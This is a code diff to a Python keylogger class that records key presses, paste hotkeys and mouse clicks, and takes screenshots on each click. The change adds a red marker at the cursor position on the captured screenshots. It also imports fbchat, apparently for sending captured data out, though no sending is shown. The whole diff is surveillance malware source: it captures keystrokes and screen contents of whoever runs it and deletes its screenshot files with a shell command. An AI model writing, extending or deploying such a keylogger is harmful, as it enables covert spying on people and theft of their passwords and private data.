@@ -1,8 +1,11 @@
 import os
+
 import glob
 import keyboard
 from keyboard import mouse
 import pyscreenshot
+from PIL import ImageDraw
+import pymouse
 import fbchat
 
 
@@ -37,7 +40,7 @@ class Keylogger(object):
 
         keyboard.on_press(self._on_key_press)
         keyboard.add_hotkey('ctrl+v', self._on_paste)
-        keyboard.mouse.on_click(self._on_left_mouse_button_click)
+        keyboard.mouse.hook(self._on_left_mouse_button_click)
 
     def toggle_screenshots_capturing(self):
         self.capture_screenshots_on_click = not self.capture_screenshots_on_click
@@ -53,11 +56,17 @@ class Keylogger(object):
         self.screenshot_counter = 0
         os.system('rm /tmp/screen*.jpg')
 
-    def _on_left_mouse_button_click(self):
+    def _on_left_mouse_button_click(self, *args, **kwargs):
         if self.capture_screenshots_on_click:
-            screenshot = pyscreenshot.grab()
+            screenshot = self._mark_mouse_position(pyscreenshot.grab())
             screenshot.save('/tmp/screen{}.jpg'.format(self.screenshot_counter))
             self.screenshot_counter += 1
+
+    def _mark_mouse_position(self, screenshot):
+        mouse_x, mouse_y = pymouse.PyMouse().position()
+        ImageDraw.Draw(screenshot).ellipse([mouse_x - 10, mouse_y - 10, mouse_x + 10, mouse_y + 10], fill=(255, 0, 0))
+
+        return screenshot
 
     def _on_key_press(self, event):
         if len(event.name) > 1:
